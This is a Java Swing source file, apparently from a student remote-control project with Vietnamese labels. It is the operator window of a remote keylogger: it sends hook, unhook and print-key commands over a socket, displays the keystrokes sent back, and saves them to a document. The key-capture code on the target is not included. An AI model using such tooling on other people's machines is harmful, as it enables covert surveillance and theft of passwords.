package client;

import static client.Client.socket;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.util.logging.Level;
import java.util.logging.Logger;

public class Keylogger extends javax.swing.JFrame {

    
    public Keylogger() throws IOException {
        initComponents();
        hook();
    }
    public void hook() throws IOException
    {
        String message = "Hook";
        DataOutputStream out = new DataOutputStream(socket.getOutputStream());
        out.writeUTF(message);
        out.flush();
        System.out.println("Da gui chuoi Hook");
    }
    
    public void unhook() throws IOException
    {
        String message = "Unhook";
        DataOutputStream out = new DataOutputStream(socket.getOutputStream());
        out.writeUTF(message);
        out.flush();
    }
    
    public void printKey() throws IOException
    {
        String message = "Printkey";
        DataOutputStream out = new DataOutputStream(socket.getOutputStream());
        out.writeUTF(message);
        out.flush();
        
        DataInputStream in = new DataInputStream(socket.getInputStream());
        String res = in.readUTF();
        System.out.println(res);
        if(res.equals("Unhook"))
        {
            return;
        }
        keyTextArea.append(res);
    }
    
    @SuppressWarnings("unchecked")
    // <editor-fold defaultstate="collapsed" desc="Generated Code">//GEN-BEGIN:initComponents
    private void initComponents() {

        hookBut = new javax.swing.JButton();
        unhookBut = new javax.swing.JButton();
        printkeyBut = new javax.swing.JButton();
        delKeylog = new javax.swing.JButton();
        jScrollPane1 = new javax.swing.JScrollPane();
        keyTextArea = new javax.swing.JTextArea();
        jLabel1 = new javax.swing.JLabel();
        jSeparator1 = new javax.swing.JSeparator();
        saveBut = new javax.swing.JButton();

        setDefaultCloseOperation(javax.swing.WindowConstants.EXIT_ON_CLOSE);

        hookBut.setText("Hook");
        hookBut.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                hookButActionPerformed(evt);
            }
        });

        unhookBut.setText("Unhook");
        unhookBut.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                unhookButActionPerformed(evt);
            }
        });

        printkeyBut.setText("In phím");
        printkeyBut.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                printkeyButActionPerformed(evt);
            }
        });

        delKeylog.setText("Xóa");
        delKeylog.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                delKeylogActionPerformed(evt);
            }
        });

        keyTextArea.setColumns(20);
        keyTextArea.setRows(5);
        jScrollPane1.setViewportView(keyTextArea);

        jLabel1.setFont(new java.awt.Font("Segoe UI", 1, 24)); // NOI18N
        jLabel1.setText("Keylogger");

        saveBut.setText("Save");
        saveBut.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                saveButActionPerformed(evt);
            }
        });

        javax.swing.GroupLayout layout = new javax.swing.GroupLayout(getContentPane());
        getContentPane().setLayout(layout);
        layout.setHorizontalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(layout.createSequentialGroup()
                .addContainerGap()
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addGroup(layout.createSequentialGroup()
                        .addGap(8, 8, 8)
                        .addComponent(hookBut)
                        .addGap(18, 18, 18)
                        .addComponent(unhookBut)
                        .addGap(18, 18, 18)
                        .addComponent(printkeyBut)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.UNRELATED)
                        .addComponent(delKeylog)
                        .addGap(18, 18, 18)
                        .addComponent(saveBut)
                        .addContainerGap(20, Short.MAX_VALUE))
                    .addGroup(layout.createSequentialGroup()
                        .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                            .addComponent(jSeparator1)
                            .addComponent(jScrollPane1))
                        .addContainerGap())))
            .addGroup(layout.createSequentialGroup()
                .addGap(156, 156, 156)
                .addComponent(jLabel1, javax.swing.GroupLayout.PREFERRED_SIZE, 127, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addContainerGap(javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
        );
        layout.setVerticalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(layout.createSequentialGroup()
                .addContainerGap()
                .addComponent(jLabel1)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(jSeparator1, javax.swing.GroupLayout.PREFERRED_SIZE, 10, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING, false)
                    .addComponent(hookBut, javax.swing.GroupLayout.Alignment.TRAILING, javax.swing.GroupLayout.PREFERRED_SIZE, 41, javax.swing.GroupLayout.PREFERRED_SIZE)
                    .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                        .addComponent(unhookBut, javax.swing.GroupLayout.PREFERRED_SIZE, 41, javax.swing.GroupLayout.PREFERRED_SIZE)
                        .addComponent(printkeyBut, javax.swing.GroupLayout.PREFERRED_SIZE, 41, javax.swing.GroupLayout.PREFERRED_SIZE)
                        .addComponent(delKeylog, javax.swing.GroupLayout.PREFERRED_SIZE, 41, javax.swing.GroupLayout.PREFERRED_SIZE)
                        .addComponent(saveBut, javax.swing.GroupLayout.PREFERRED_SIZE, 38, javax.swing.GroupLayout.PREFERRED_SIZE)))
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(jScrollPane1, javax.swing.GroupLayout.DEFAULT_SIZE, 251, Short.MAX_VALUE)
                .addContainerGap())
        );

        pack();
    }// </editor-fold>//GEN-END:initComponents

    private void printkeyButActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_printkeyButActionPerformed
        try {
            printKey();
        } catch (IOException ex) {
            Logger.getLogger(Keylogger.class.getName()).log(Level.SEVERE, null, ex);
        }
    }//GEN-LAST:event_printkeyButActionPerformed

    private void delKeylogActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_delKeylogActionPerformed
        keyTextArea.setText("");
    }//GEN-LAST:event_delKeylogActionPerformed

    private void unhookButActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_unhookButActionPerformed
        try {
            unhook();
        } catch (IOException ex) {
            Logger.getLogger(Keylogger.class.getName()).log(Level.SEVERE, null, ex);
        }
    }//GEN-LAST:event_unhookButActionPerformed

    private void hookButActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_hookButActionPerformed
        try {
            hook();
        } catch (IOException ex) {
            Logger.getLogger(Keylogger.class.getName()).log(Level.SEVERE, null, ex);
        }
    }//GEN-LAST:event_hookButActionPerformed

    private void saveButActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_saveButActionPerformed
        SaveAs save = new SaveAs(keyTextArea);
        save.save_to_docx();
    }//GEN-LAST:event_saveButActionPerformed

    // Variables declaration - do not modify//GEN-BEGIN:variables
    private javax.swing.JButton delKeylog;
    private javax.swing.JButton hookBut;
    private javax.swing.JLabel jLabel1;
    private javax.swing.JScrollPane jScrollPane1;
    private javax.swing.JSeparator jSeparator1;
    private javax.swing.JTextArea keyTextArea;
    private javax.swing.JButton printkeyBut;
    private javax.swing.JButton saveBut;
    private javax.swing.JButton unhookBut;
    // End of variables declaration//GEN-END:variables
}
